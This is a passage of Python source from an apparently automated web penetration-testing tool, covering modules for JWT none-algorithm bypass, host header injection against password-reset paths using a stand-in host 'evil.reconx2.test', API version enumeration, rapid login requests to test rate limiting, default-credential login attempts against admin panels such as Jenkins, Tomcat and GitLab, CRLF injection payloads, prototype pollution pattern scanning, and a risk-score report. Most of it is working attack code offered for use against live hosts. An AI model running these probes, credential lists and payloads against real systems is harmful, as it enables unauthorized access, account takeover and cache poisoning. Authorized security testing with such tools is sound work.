                    f"JWT weak algorithm [{alg}] found at {source}")

            if is_exp:
                finding["issues"].append("Token expired (server may still accept it)")

            if role and any(r in str(role).lower() for r in ["admin","super","root"]):
                finding["issues"].append(f"Elevated role in JWT: {role}")
                self.db.add_sensitive(url, "200", "HIGH",
                    f"JWT elevated role [{role}] — check for privilege escalation")

            # Test none algorithm bypass
            none_result = await loop.run_in_executor(None, _test_none_alg, url, token)
            if none_result:
                none_tok, code = none_result
                finding["issues"].append(f"NONE ALG BYPASS WORKS! [{code}]")
                self.db.add_sensitive(url, str(code), "CRITICAL",
                    f"JWT none algorithm bypass CONFIRMED on {url}")
                warn(f"  {C.RED}JWT CRITICAL{C.RESET} none-alg bypass at {url[:60]}")

            if finding["issues"]:
                jwt_findings.append(finding)
                col = C.RED if any("BYPASS" in x or "CRITICAL" in x for x in finding["issues"]) else C.ORANGE
                warn(f"  {col}JWT{C.RESET} [{alg}] sub={sub} role={role} | {', '.join(finding['issues'][:2])}")

        # Write report
        with open(f"{self.outdir}/raw/jwt_findings.txt", "w") as f:
            f.write(f"JWT Analysis for {self.domain}\n" + "="*50 + "\n\n")
            f.write(f"Tokens found: {len(unique_jwts)}\n")
            f.write(f"With issues:  {len(jwt_findings)}\n\n")
            for jf in jwt_findings:
                f.write(f"URL: {jf['url']}\n")
                f.write(f"  Source:  {jf['source']}\n")
                f.write(f"  Alg:     {jf['alg']}\n")
                f.write(f"  Subject: {jf['sub']}\n")
                f.write(f"  Role:    {jf['role']}\n")
                f.write(f"  Expired: {jf['expired']}\n")
                for issue in jf["issues"]:
                    f.write(f"  ISSUE:   {issue}\n")
                f.write("\n")

        success(f"JWT: {C.GREEN}{len(unique_jwts)}{C.RESET} tokens, {C.RED}{len(jwt_findings)}{C.RESET} issues found")
        self.db.mark_done("jwt_attack")

    # --- MODULE 29: HOST HEADER INJECTION -----------------------------------------
    async def host_header_injection(self):
        section("MODULE 29 -- HOST HEADER INJECTION")
        if self._skip("host_header"): return

        live_urls = self.db.get_live_urls()
        if not live_urls:
            warn("No live hosts"); self.db.mark_done("host_header"); return

        info(f"Testing host header injection on {C.CYAN}{len(live_urls)}{C.RESET} hosts...")
        loop = asyncio.get_event_loop()
        findings = []
        evil = "evil.reconx2.test"

        # Test headers that may be used for password reset / redirect
        POISON_HEADERS = [
            {"Host": evil},
            {"Host": f"{evil}:80"},
            {"X-Forwarded-Host": evil},
            {"X-Host": evil},
            {"X-Forwarded-Server": evil},
            {"X-HTTP-Host-Override": evil},
            {"Forwarded": f"host={evil}"},
            {"X-Original-Host": evil},
        ]

        # Common paths that use Host header for link generation
        RESET_PATHS = [
            "/password-reset", "/forgot-password", "/reset-password",
            "/auth/forgot", "/user/forgot-password", "/api/v1/password/reset",
            "/api/auth/forgot", "/account/forgot-password",
        ]

        def _test_host_inject(base_url, path, headers):
            url = base_url.rstrip("/") + path
            try:
                req = urllib.request.Request(
                    url,
                    data=json.dumps({"email": f"test@{self.domain}"}).encode(),
                    headers={
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0",
                        **headers
                    },
                    method="POST"
                )
                with urllib.request.urlopen(req, timeout=8) as r:
                    body = r.read(2000).decode("utf-8", errors="ignore")
                    if evil in body:
                        return url, r.status, "body", list(headers.keys())[0]
                    # Check response headers for poisoned value
                    for hdr_name in ["location", "link", "content-location"]:
                        val = r.headers.get(hdr_name, "")
                        if evil in val:
                            return url, r.status, f"header:{hdr_name}", list(headers.keys())[0]
            except urllib.error.HTTPError as e:
                try:
                    body = e.read(500).decode("utf-8", errors="ignore")
                    if evil in body:
                        return url, e.code, "body", list(headers.keys())[0]
                except Exception:
                    pass
            except Exception:
                pass
            return None

        # Also test cache poisoning — send evil host and check if cached
        def _test_cache_poison(base_url, hdrs):
            try:
                req = urllib.request.Request(
                    base_url,
                    headers={"User-Agent": "Mozilla/5.0", **hdrs}
                )
                with urllib.request.urlopen(req, timeout=8) as r:
                    body = r.read(5000).decode("utf-8", errors="ignore")
                    cache_hdr = r.headers.get("x-cache", "").lower()
                    age_hdr   = r.headers.get("age", "")
                    if evil in body:
                        return base_url, r.status, "cache-poison", list(hdrs.keys())[0]
            except Exception:
                pass
            return None

        sem = asyncio.Semaphore(10)
        async def test_host(url):
            async with sem:
                results = []
                # Test password reset paths
                for path in RESET_PATHS:
                    for hdrs in POISON_HEADERS[:4]:
                        r = await loop.run_in_executor(
                            None, _test_host_inject, url, path, hdrs
                        )
                        if r:
                            results.append(r)
                            break
                # Test cache poisoning
                for hdrs in POISON_HEADERS[:3]:
                    r = await loop.run_in_executor(
                        None, _test_cache_poison, url, hdrs
                    )
                    if r:
                        results.append(r)
                return results

        all_res = await asyncio.gather(*[test_host(u) for u in live_urls])
        for results in all_res:
            for url, code, location, hdr_used in results:
                findings.append((url, code, location, hdr_used))
                sev = "CRITICAL" if "reset" in url.lower() else "HIGH"
                self.db.add_sensitive(url, str(code), sev,
                    f"Host header injection [{hdr_used}] reflected in {location}")
                warn(f"  {C.RED}HOST INJECT [{sev}]{C.RESET} [{hdr_used}] {url[:65]}")

        with open(f"{self.outdir}/raw/host_header_findings.txt", "w") as f:
            f.write(f"Host Header Injection for {self.domain}\n" + "="*50 + "\n\n")
            if findings:
                for url, code, loc, hdr in findings:
                    f.write(f"[{code}] [{hdr}] reflected in {loc}\n  {url}\n\n")
            else:
                f.write(f"Tested {len(live_urls)} hosts x {len(POISON_HEADERS)} headers\n")
                f.write("No host header injection found.\n")

        success(f"Host header injection: {C.RED if findings else C.GREEN}{len(findings)}{C.RESET} findings")
        self.db.mark_done("host_header")

    # --- MODULE 30: API VERSION ENUMERATION ---------------------------------------
    async def api_version_enum(self):
        section("MODULE 30 -- API VERSION ENUMERATION")
        if self._skip("api_version"): return

        live_urls = self.db.get_live_urls()
        if not live_urls:
            warn("No live hosts"); self.db.mark_done("api_version"); return

        info("Enumerating API versions on all live hosts...")
        loop = asyncio.get_event_loop()

        # Version prefixes to try
        VERSION_PATHS = [
            "/v0", "/v1", "/v2", "/v3", "/v4", "/v5",
            "/api/v0", "/api/v1", "/api/v2", "/api/v3", "/api/v4",
            "/api/v1.0", "/api/v2.0", "/api/v1.1",
            "/api/mobile/v1", "/api/mobile/v2",
            "/api/internal", "/api/private", "/api/admin",
            "/api/legacy", "/api/old", "/api/beta", "/api/alpha",
            "/api/unstable", "/api/stable",
            "/rest/v1", "/rest/v2",
            "/graphql/v1", "/graphql/v2",
            "/service/v1", "/services/v1",
        ]

        found_versions = []
        sem = asyncio.Semaphore(20)

        def _probe_version(base_url, path):
            url = base_url.rstrip("/") + path
            try:
                req = urllib.request.Request(
                    url,
                    headers={
                        "User-Agent": "Mozilla/5.0",
                        "Accept": "application/json",
                    }
                )
                with urllib.request.urlopen(req, timeout=6) as r:
                    body = r.read(500).decode("utf-8", errors="ignore")
                    if r.status in [200, 201]:
                        # Check it returned API-like content
                        if any(k in body for k in
                               ['"status"', '"data"', '"error"',
                                '"message"', '"version"', '"api"', '{']):
                            return url, r.status, body[:100]
                    elif r.status == 301:
                        loc = r.headers.get("location", "")
                        return url, r.status, f"-> {loc}"
            except urllib.error.HTTPError as e:
                if e.code not in [404, 410]:
                    try:
                        body = e.read(200).decode("utf-8", errors="ignore")
                        return url, e.code, body[:80]
                    except Exception:
                        return url, e.code, ""
            except Exception:
                pass
            return None

        async def probe(base, path):
            async with sem:
                return await loop.run_in_executor(None, _probe_version, base, path)

        tasks = [probe(b, p) for b in live_urls for p in VERSION_PATHS]
        results = await asyncio.gather(*tasks)

        for r in results:
            if r:
                url, code, preview = r
                found_versions.append((url, code, preview))
                self.db.add_url(url, "api-version-enum")
                sev = "MEDIUM" if "/internal" in url or "/private" in url or "/admin" in url else "INFO"
                if sev == "MEDIUM":
                    self.db.add_sensitive(url, str(code), sev,
                        f"Internal/private API version exposed: {preview[:40]}")
                    warn(f"  {C.ORANGE}API [{code}]{C.RESET} {url}")
                else:
                    info(f"  API version [{code}]: {url}")

        with open(f"{self.outdir}/raw/api_versions.txt", "w") as f:
            f.write(f"API Version Enumeration for {self.domain}\n" + "="*50 + "\n\n")
            f.write(f"Found {len(found_versions)} API version endpoints\n\n")
            for url, code, preview in found_versions:
                f.write(f"[{code}] {url}\n  {preview[:80]}\n")

        success(f"API version enum: {C.GREEN}{len(found_versions)}{C.RESET} endpoints discovered")
        self.db.mark_done("api_version")

    # --- MODULE 31: RATE LIMIT TESTING --------------------------------------------
    async def rate_limit_test(self):
        section("MODULE 31 -- RATE LIMIT TESTING")
        if self._skip("rate_limit"): return

        live_urls = self.db.get_live_urls()
        if not live_urls:
            warn("No live hosts"); self.db.mark_done("rate_limit"); return

        # Find auth-related endpoints
        auth_paths = [
            "/login", "/signin", "/auth/login", "/api/login", "/api/auth",
            "/api/v1/login", "/api/v1/auth", "/auth", "/user/login",
            "/account/login", "/oauth/token", "/api/token",
            "/forgot-password", "/password-reset", "/verify-otp",
            "/api/otp", "/api/verify", "/api/2fa",
        ]

        info("Finding authentication endpoints for rate limit testing...")
        loop = asyncio.get_event_loop()
        auth_endpoints = []

        def _find_auth(base, path):
            url = base.rstrip("/") + path
            try:
                req = urllib.request.Request(
                    url,
                    data=b'{}',
                    headers={"Content-Type": "application/json",
                             "User-Agent": "Mozilla/5.0"},
                    method="POST"
                )
                with urllib.request.urlopen(req, timeout=6) as r:
                    if r.status not in [404, 410, 501]:
                        return url, r.status
            except urllib.error.HTTPError as e:
                if e.code not in [404, 410, 501]:
                    return url, e.code
            except Exception:
                pass
            return None

        sem1 = asyncio.Semaphore(20)
        async def probe_auth(base, path):
            async with sem1:
                return await loop.run_in_executor(None, _find_auth, base, path)

        results = await asyncio.gather(*[probe_auth(b, p) for b in live_urls for p in auth_paths])
        for r in results:
            if r:
                auth_endpoints.append(r)

        if not auth_endpoints:
            info("No auth endpoints found for rate limit testing")
            self.db.mark_done("rate_limit")
            return

        info(f"Testing rate limiting on {C.CYAN}{len(auth_endpoints[:10])}{C.RESET} auth endpoints...")
        rl_findings = []

        def _rate_limit_test(url):
            """Send 20 rapid requests and check if 429 is returned."""
            codes = []
            for i in range(20):
                try:
                    req = urllib.request.Request(
                        url,
                        data=json.dumps({
                            "username": f"test{i}@test.com",
                            "password": "wrongpassword123"
                        }).encode(),
                        headers={"Content-Type": "application/json",
                                 "User-Agent": f"Mozilla/5.0 (test-{i})"},
                        method="POST"
                    )
                    with urllib.request.urlopen(req, timeout=5) as r:
                        codes.append(r.status)
                except urllib.error.HTTPError as e:
                    codes.append(e.code)
                except Exception:
                    break
            return codes

        sem2 = asyncio.Semaphore(3)
        async def test_rl(url, orig_code):
            async with sem2:
                codes = await loop.run_in_executor(None, _rate_limit_test, url)
                if not codes:
                    return
                has_429  = 429 in codes
                has_lock = any(c in codes for c in [423, 403])
                all_same = len(set(codes)) == 1 and codes[0] == orig_code

                if all_same and orig_code in [200, 401, 422]:
                    # No rate limiting — all 20 requests returned same code
                    rl_findings.append((url, codes, "NO_RATE_LIMIT"))
                    self.db.add_sensitive(url, str(orig_code), "MEDIUM",
                        f"No rate limiting on auth endpoint — {len(codes)} rapid requests all returned {orig_code}")
                    warn(f"  {C.ORANGE}NO RATE LIMIT{C.RESET} {url[:65]}")
                    warn(f"    20 rapid POST requests: all returned {orig_code}")
                elif has_429:
                    info(f"  Rate limited: {url[:60]} (429 after {codes.index(429)+1} requests)")

        await asyncio.gather(*[test_rl(url, code) for url, code in auth_endpoints[:10]])

        with open(f"{self.outdir}/raw/rate_limit_findings.txt", "w") as f:
            f.write(f"Rate Limit Testing for {self.domain}\n" + "="*50 + "\n\n")
            f.write(f"Auth endpoints found: {len(auth_endpoints)}\n")
            f.write(f"No rate limit on: {len([x for x in rl_findings if x[2]=='NO_RATE_LIMIT'])}\n\n")
            for url, codes, status in rl_findings:
                f.write(f"[{status}] {url}\n")
                f.write(f"  Response codes: {codes[:20]}\n\n")
            if not rl_findings:
                f.write("All tested endpoints appear to have rate limiting.\n")

        vuln = [x for x in rl_findings if x[2] == "NO_RATE_LIMIT"]
        success(f"Rate limit: {C.RED if vuln else C.GREEN}{len(vuln)}{C.RESET} endpoints missing rate limits")
        self.db.mark_done("rate_limit")

    # --- MODULE 32: DEFAULT CREDENTIALS TESTING -----------------------------------
    async def default_creds(self):
        section("MODULE 32 -- DEFAULT CREDENTIALS TESTING")
        if self._skip("default_creds"): return

        live_urls = self.db.get_live_urls()
        if not live_urls:
            warn("No live hosts"); self.db.mark_done("default_creds"); return

        info("Testing default credentials on detected admin panels...")
        loop = asyncio.get_event_loop()
        found = []

        # Technology-specific default creds
        TECH_CREDS = {
            "jenkins":      [("admin","admin"), ("jenkins","jenkins"), ("admin","password")],
            "grafana":      [("admin","admin"), ("admin","grafana"), ("admin","password123")],
            "kibana":       [("elastic","changeme"), ("kibana","changeme"), ("admin","admin")],
            "tomcat":       [("admin","admin"), ("tomcat","tomcat"), ("admin","s3cret"), ("tomcat","s3cret")],
            "phpmyadmin":   [("root",""), ("root","root"), ("admin","admin"), ("pma","")],
            "wordpress":    [("admin","admin"), ("admin","password"), ("admin","123456")],
            "joomla":       [("admin","admin"), ("administrator","admin")],
            "drupal":       [("admin","admin"), ("drupal","drupal")],
            "sonarqube":    [("admin","admin"), ("admin","sonar")],
            "elasticsearch":[("elastic","elastic"), ("admin","admin")],
            "rabbitmq":     [("guest","guest"), ("admin","admin")],
            "redis":        [("",""), ("redis","redis")],
            "mongo":        [("admin","admin"), ("root","root")],
            "nexus":        [("admin","admin123"), ("nexus","nexus")],
            "gitlab":       [("root","5iveL!fe"), ("admin","admin")],
            "portainer":    [("admin","admin"), ("admin","password")],
            "traefik":      [("admin","admin")],
            "prometheus":   [("admin","admin")],
        }

        # Panel detection paths
        PANEL_PATHS = {
            "jenkins":       ["/", "/login", "/j_spring_security_check"],
            "grafana":       ["/", "/login", "/api/login"],
            "kibana":        ["/", "/login", "/api/security/v1/login"],
            "tomcat":        ["/manager/html", "/manager/", "/host-manager/"],
            "phpmyadmin":    ["/phpmyadmin/", "/pma/", "/phpMyAdmin/"],
            "wordpress":     ["/wp-login.php", "/wp-admin/"],
            "sonarqube":     ["/", "/api/authentication/login"],
            "elasticsearch": ["/:9200/_cat/indices", "/_cat/indices"],
            "rabbitmq":      [":15672/", ":15672/api/overview"],
            "nexus":         ["/nexus/", "/#browse/welcome"],
            "gitlab":        ["/users/sign_in", "/api/v4/session"],
        }

        # Get detected technologies
        tech_raw = ""
        try:
            tech_raw = open(f"{self.outdir}/tech/whatweb_brief.txt").read().lower()
        except Exception:
            pass

        # Identify which tech panels to test
        panels_to_test = set()
        for tech in TECH_CREDS:
            if tech in tech_raw or any(tech in u.lower() for u in live_urls):
                panels_to_test.add(tech)
        # Always test common ones
        panels_to_test.update(["wordpress", "jenkins", "grafana", "tomcat", "phpmyadmin"])

        def _try_cred(url, tech, user, pwd):
            """Try a single credential pair."""
            # Try JSON login
            for data, ct in [
                (json.dumps({"username": user, "password": pwd}), "application/json"),
                (json.dumps({"user": user, "password": pwd}), "application/json"),
                (json.dumps({"email": user, "password": pwd}), "application/json"),
                (urllib.parse.urlencode({"username": user, "password": pwd,
                                         "j_username": user, "j_password": pwd}),
                 "application/x-www-form-urlencoded"),
            ]:
                try:
                    req = urllib.request.Request(
                        url,
                        data=data.encode(),
                        headers={"Content-Type": ct, "User-Agent": "Mozilla/5.0"},
                        method="POST"
                    )
                    with urllib.request.urlopen(req, timeout=6) as r:
                        body = r.read(1000).decode("utf-8", errors="ignore")
                        # Success indicators
                        if r.status in [200, 302]:
                            if any(s in body.lower() for s in
                                   ["dashboard", "logout", "welcome", "token",
                                    '"ok":true', '"success":true', "logged in"]):
                                return True, r.status, body[:100]
                        if r.status in [200] and '"token"' in body:
                            return True, r.status, body[:100]
                except Exception:
                    pass
            return False, None, ""

        sem = asyncio.Semaphore(5)
        async def test_panel(base_url, tech):
            async with sem:
                paths = PANEL_PATHS.get(tech, ["/login", "/admin", "/"])
                creds = TECH_CREDS.get(tech, [])
                for path in paths:
                    panel_url = base_url.rstrip("/") + path
                    for user, pwd in creds:
                        ok, code, snippet = await loop.run_in_executor(
                            None, _try_cred, panel_url, tech, user, pwd
                        )
                        if ok:
                            return (panel_url, tech, user, pwd, code, snippet)
            return None

        tasks = [test_panel(u, t) for u in live_urls for t in panels_to_test]
        results = await asyncio.gather(*tasks)

        for r in results:
            if r:
                url, tech, user, pwd, code, snippet = r
                found.append(r)
                self.db.add_sensitive(url, str(code), "CRITICAL",
                    f"Default creds [{tech}] {user}:{pwd} — login succeeded!")
                warn(f"  {C.RED}DEFAULT CREDS{C.RESET} [{tech}] {user}:{pwd} at {url[:60]}")

        with open(f"{self.outdir}/raw/default_creds.txt", "w") as f:
            f.write(f"Default Credentials for {self.domain}\n" + "="*50 + "\n\n")
            if found:
                for url, tech, user, pwd, code, snippet in found:
                    f.write(f"[CRITICAL] [{tech}] {user}:{pwd}\n  URL: {url}\n  Response: {snippet}\n\n")
            else:
                f.write(f"Tested {len(panels_to_test)} technology panels\n")
                f.write("No default credentials found.\n")
                f.write("\nPanels tested: " + ", ".join(sorted(panels_to_test)) + "\n")

        success(f"Default creds: {C.RED if found else C.GREEN}{len(found)}{C.RESET} valid default logins found")
        self.db.mark_done("default_creds")

    # --- MODULE 33: CRLF INJECTION TESTING ----------------------------------------
    async def crlf_test(self):
        section("MODULE 33 -- CRLF INJECTION TESTING")
        if self._skip("crlf"): return

        live_urls = self.db.get_live_urls()
        if not live_urls:
            warn("No live hosts"); self.db.mark_done("crlf"); return

        # Get param URLs for CRLF testing
        param_urls = self.db.conn.execute(
            "SELECT url FROM urls WHERE has_params=1 LIMIT 500"
        ).fetchall()
        all_targets = [r[0] for r in param_urls] + live_urls[:20]

        info(f"Testing {C.CYAN}{len(all_targets[:200])}{C.RESET} targets for CRLF injection...")
        loop = asyncio.get_event_loop()
        findings = []

        CRLF_PAYLOADS = [
            "%0d%0aX-CRLF-Injected: reconx2",         # Basic CRLF
            "%0aX-CRLF-Injected: reconx2",             # LF only
            "%0d%0a%20X-CRLF-Injected: reconx2",       # CRLF + space
            "%E5%98%8D%E5%98%8AX-CRLF-Injected: r2",   # Unicode CRLF
            "/%0d%0aX-CRLF-Injected: reconx2",
            "%23%0d%0aX-CRLF-Injected: reconx2",       # After #
            "%3f%0d%0aX-CRLF-Injected: reconx2",       # After ?
            "\\r\\nX-CRLF-Injected: reconx2",
        ]

        def _test_crlf(url, payload):
            # Inject in URL path
            test_url = url + payload
            try:
                req = urllib.request.Request(
                    test_url,
                    headers={"User-Agent": "Mozilla/5.0"}
                )
                with urllib.request.urlopen(req, timeout=6) as r:
                    # Check if injected header appears in response
                    if r.headers.get("x-crlf-injected"):
                        return url, test_url, r.status, "header-injected"
                    # Check Set-Cookie or other headers
                    for h, v in r.headers.items():
                        if "crlf" in v.lower() or "reconx2" in v.lower():
                            return url, test_url, r.status, f"reflected-in-{h}"
            except urllib.error.HTTPError as e:
                try:
                    for h, v in e.headers.items():
                        if "reconx2" in v.lower():
                            return url, test_url, e.code, f"reflected-in-{h}"
                except Exception:
                    pass
            except Exception:
                pass
            return None

        sem = asyncio.Semaphore(20)
        async def test_one(url):
            async with sem:
                for payload in CRLF_PAYLOADS[:4]:
                    r = await loop.run_in_executor(None, _test_crlf, url, payload)
                    if r:
                        return r
            return None

        results = await asyncio.gather(*[test_one(u) for u in all_targets[:200]])
        for r in results:
            if r:
                orig_url, test_url, code, location = r
                findings.append(r)
                self.db.add_sensitive(orig_url, str(code), "HIGH",
                    f"CRLF injection reflected in {location}: {test_url[:60]}")
                warn(f"  {C.ORANGE}CRLF{C.RESET} [{code}] {orig_url[:60]}")

        with open(f"{self.outdir}/raw/crlf_findings.txt", "w") as f:
            f.write(f"CRLF Injection for {self.domain}\n" + "="*50 + "\n\n")
            if findings:
                for orig, test, code, loc in findings:
                    f.write(f"[HIGH] CRLF reflected in {loc}\n  Original: {orig}\n  Test URL: {test}\n\n")
            else:
                f.write(f"Tested {len(all_targets[:200])} targets\nNo CRLF injection found.\n")

        success(f"CRLF injection: {C.RED if findings else C.GREEN}{len(findings)}{C.RESET} vulnerabilities found")
        self.db.mark_done("crlf")

    # --- MODULE 34: PROTOTYPE POLLUTION DETECTION ---------------------------------
    async def prototype_pollution(self):
        section("MODULE 34 -- PROTOTYPE POLLUTION DETECTION")
        if self._skip("proto_pollution"): return

        js_files = read_file(f"{self.outdir}/js/js_files.txt")
        if not js_files:
            info("No JS files -- skipping prototype pollution")
            self.db.mark_done("proto_pollution")
            return

        info(f"Analyzing {C.CYAN}{min(len(js_files),200)}{C.RESET} JS files for prototype pollution...")

        # Patterns that indicate prototype pollution vulnerabilities
        POLLUTION_PATTERNS = [
            # Direct __proto__ manipulation
            (r"__proto__\s*\[", "CRITICAL",
             "Direct __proto__ property access with bracket notation"),
            (r'__proto__\s*\.\s*\w+\s*=', "CRITICAL",
             "Direct __proto__ property assignment"),
            # constructor.prototype
            (r'constructor\s*\]\s*\[\s*["\']prototype', "HIGH",
             "constructor.prototype access via bracket notation"),
            (r'\.constructor\.prototype\s*\.\s*\w+\s*=', "HIGH",
             "constructor.prototype property assignment"),
            # Unsafe merge/extend functions
            (r'function\s+\w*(?:merge|extend|assign|mixin|clone|deep[Cc]opy|deepMerge)\s*\([^)]*\)\s*\{[^}]*for\s*\([^)]*in', "HIGH",
             "Unsafe merge/extend function iterating object keys"),
            # Dangerous object access patterns
            (r'Object\.assign\s*\(\s*\{\s*\}\s*,\s*(?:req\.(?:body|query|params)|JSON\.parse)', "HIGH",
             "Object.assign with user-controlled input"),
            # jQuery extend deep
            (r'\$\.extend\s*\(\s*true', "MEDIUM",
             "jQuery deep extend (potentially pollutable)"),
            # Common vulnerable libraries
            (r'lodash|_\.merge\s*\(', "MEDIUM",
             "lodash merge usage (check version for CVE-2019-10744)"),
        ]

        all_findings = []
        sem = asyncio.Semaphore(10)

        async def analyze(url):
            async with sem:
                content = await http_get(url, timeout=12)
                if not content or len(content) < 100:
                    return []
                found = []
                for pattern, sev, desc in POLLUTION_PATTERNS:
                    try:
                        matches = list(re.finditer(pattern, content, re.IGNORECASE))
                        for m in matches[:3]:
                            snippet = content[max(0, m.start()-50):m.end()+100].strip()
                            found.append({
                                "url": url, "severity": sev,
                                "desc": desc, "snippet": snippet[:150]
                            })
                    except Exception:
                        pass
                return found

        all_res = await asyncio.gather(*[analyze(u) for u in js_files[:200]])
        seen = set()
        for results in all_res:
            for f in results:
                key = (f["url"], f["desc"][:30])
                if key not in seen:
                    seen.add(key)
                    all_findings.append(f)
                    if f["severity"] in ["CRITICAL", "HIGH"]:
                        col = C.RED if f["severity"] == "CRITICAL" else C.ORANGE
                        warn(f"  {col}PROTO POLL {f['severity']}{C.RESET} {f['url'][:60]}")
                        self.db.add_sensitive(f["url"], "200", f["severity"],
                            f"Prototype pollution: {f['desc'][:60]}")

        with open(f"{self.outdir}/raw/prototype_pollution.txt", "w") as f:
            f.write(f"Prototype Pollution for {self.domain}\n" + "="*50 + "\n\n")
            f.write(f"JS analyzed: {min(len(js_files),200)}\n")
            f.write(f"Findings: {len(all_findings)}\n\n")
            for sev in ["CRITICAL", "HIGH", "MEDIUM"]:
                items = [x for x in all_findings if x["severity"] == sev]
                if items:
                    f.write(f"[{sev}] {len(items)} findings\n")
                    for item in items[:15]:
                        f.write(f"  {item['desc']}\n  {item['url']}\n")
                        f.write(f"  Code: {item['snippet'][:100]}\n\n")

        crit = [x for x in all_findings if x["severity"] in ["CRITICAL", "HIGH"]]
        success(f"Prototype pollution: {C.RED if crit else C.GREEN}{len(crit)}{C.RESET} high-risk, {len(all_findings)} total patterns")
        self.db.mark_done("proto_pollution")



    # --- MODULE 35: EXECUTIVE SUMMARY + RISK SCORE --------------------------------
    async def executive_summary(self):
        section("MODULE 35 -- EXECUTIVE SUMMARY & RISK SCORE")
        if self._skip("exec_summary"): return

        info("Calculating risk score and generating executive summary...")

        # ── Risk Scoring ──────────────────────────────────────────────────
        score = 0
        max_score = 100
        risk_breakdown = []

        def add_risk(points, label, detail=""):
            nonlocal score
            score = min(score + points, max_score)
            risk_breakdown.append((points, label, detail))

        # Critical vulnerabilities (+20 each, max 40)
        n_crit = self.db.count("sensitive_paths", "risk_level='CRITICAL'")
        n_nuc_crit = self.db.count("nuclei_findings", "severity='critical'")
        n_ssrf = self.db.conn.execute(
            "SELECT COUNT(*) FROM sensitive_paths WHERE notes LIKE 'SSRF%'"
        ).fetchone()[0]
        n_def = self.db.conn.execute(
            "SELECT COUNT(*) FROM sensitive_paths WHERE notes LIKE 'Default cred%'"
        ).fetchone()[0]
        n_axfr = self.db.conn.execute(
            "SELECT COUNT(*) FROM sensitive_paths WHERE notes LIKE '%Zone Transfer%' OR notes LIKE '%AXFR%'"
        ).fetchone()[0]

        if n_crit > 0:     add_risk(min(n_crit*10, 25), f"{n_crit} CRITICAL path findings", "Exposed credentials/source code")
        if n_nuc_crit > 0: add_risk(min(n_nuc_crit*15, 25), f"{n_nuc_crit} CRITICAL nuclei findings", "Active exploitable vulnerabilities")
        if n_ssrf > 0:     add_risk(25, "SSRF to cloud metadata", "Full cloud instance compromise possible")
        if n_def > 0:      add_risk(30, "Default credentials valid", "Direct authenticated access")
        if n_axfr > 0:     add_risk(20, "DNS zone transfer", "Full internal subdomain exposure")

        # High vulnerabilities (+10 each, max 30)
        n_high = self.db.count("sensitive_paths", "risk_level='HIGH'")
        n_nuc_high = self.db.count("nuclei_findings", "severity='high'")
        n_bypass = self.db.conn.execute(
            "SELECT COUNT(*) FROM sensitive_paths WHERE notes LIKE '403 BYPASS%'"
        ).fetchone()[0]
        n_cors = self.db.conn.execute(
            "SELECT COUNT(*) FROM sensitive_paths WHERE notes LIKE 'CORS:%'"
        ).fetchone()[0]
        n_jwt = self.db.conn.execute(
            "SELECT COUNT(*) FROM sensitive_paths WHERE notes LIKE 'JWT%'"
        ).fetchone()[0]
        n_redir = self.db.conn.execute(
            "SELECT COUNT(*) FROM sensitive_paths WHERE notes LIKE 'Open redirect%'"
        ).fetchone()[0]

        if n_high > 0:     add_risk(min(n_high*3, 15), f"{n_high} HIGH findings")
        if n_nuc_high > 0: add_risk(min(n_nuc_high*5, 15), f"{n_nuc_high} HIGH nuclei findings")
        if n_bypass > 0:   add_risk(min(n_bypass*5, 10), f"{n_bypass} 403 bypasses confirmed")
        if n_cors > 0:     add_risk(min(n_cors*5, 10), f"{n_cors} CORS misconfigurations")
        if n_jwt > 0:      add_risk(10, f"{n_jwt} JWT vulnerabilities")
        if n_redir > 0:    add_risk(min(n_redir*3, 10), f"{n_redir} open redirects")

        # Medium/exposure (+5 each, max 20)
        n_med = self.db.count("sensitive_paths", "risk_level='MEDIUM'")
        n_sec_js = self.db.count("js_files", "has_secret=1")
        n_buckets = self.db.conn.execute(
            "SELECT COUNT(*) FROM sensitive_paths WHERE notes LIKE 'Cloud bucket%'"
        ).fetchone()[0]
        n_gql = self.db.conn.execute(
            "SELECT COUNT(*) FROM sensitive_paths WHERE notes LIKE 'GraphQL%'"
        ).fetchone()[0]

        if n_med > 0:     add_risk(min(n_med*2, 10), f"{n_med} MEDIUM findings")
        if n_sec_js > 0:  add_risk(min(n_sec_js*3, 10), f"{n_sec_js} JS files with secrets")
        if n_buckets > 0: add_risk(min(n_buckets*5, 10), f"{n_buckets} exposed cloud buckets")
        if n_gql > 0:     add_risk(5, f"{n_gql} GraphQL endpoints exposed")

        # Risk level label
        if score >= 75:    risk_label = "CRITICAL"
        elif score >= 50:  risk_label = "HIGH"
        elif score >= 25:  risk_label = "MEDIUM"
        elif score >= 10:  risk_label = "LOW"
        else:              risk_label = "INFORMATIONAL"

        # ── Generate Markdown Executive Summary ───────────────────────────
        ts = __import__("datetime").datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        dur = int(__import__("time").time() - self.start_time)

        summary_md = f"""# Penetration Test Executive Summary
## Target: {self.domain}
**Date:** {ts}
**Duration:** {dur//3600}h {(dur%3600)//60}m
**Overall Risk Score:** {score}/100 — **{risk_label}**

---

## Risk Overview

| Metric | Count |
|--------|-------|
| Subdomains Discovered | {self.db.count("subdomains")} |
| Live Hosts | {self.db.count("subdomains","is_live=1")} |
| Total URLs Discovered | {self.db.count("urls")} |
| JavaScript Files | {self.db.count("urls","extension='.js'")} |
| JS Files with Secrets | {n_sec_js} |
| Critical Findings | {n_crit + n_nuc_crit} |
| High Findings | {n_high + n_nuc_high} |
| Medium Findings | {n_med} |
| Nuclei Total | {self.db.count("nuclei_findings")} |

---

## Critical Findings Summary

"""
        # List top critical findings
        crit_rows = self.db.conn.execute(
            "SELECT url, notes FROM sensitive_paths WHERE risk_level='CRITICAL' LIMIT 10"
        ).fetchall()
        if crit_rows:
            for url, notes in crit_rows:
                summary_md += f"- **{url}**\n  {notes}\n\n"
        else:
            summary_md += "_No critical findings._\n\n"

        summary_md += "\n## Risk Score Breakdown\n\n"
        for pts, label, detail in sorted(risk_breakdown, key=lambda x: -x[0]):
            summary_md += f"- **+{pts}** {label}"
            if detail: summary_md += f" — _{detail}_"
            summary_md += "\n"

        summary_md += f"""

---

## Remediation Priorities

### Immediate (Critical)
"""
        if n_def:      summary_md += "1. **Change default credentials** on all detected admin panels immediately\n"
        if n_ssrf:     summary_md += "2. **Patch SSRF vulnerability** — attacker can access cloud instance metadata\n"
        if n_axfr:     summary_md += "3. **Restrict zone transfers** to authorized DNS servers only\n"
        if n_crit:     summary_md += f"4. **Investigate {n_crit} critical path exposures** (env files, git repos, keys)\n"
        if n_nuc_crit: summary_md += f"5. **Patch {n_nuc_crit} critical CVEs** identified by nuclei scanner\n"

        summary_md += f"""
### Short-term (High)
- Implement rate limiting on all authentication endpoints
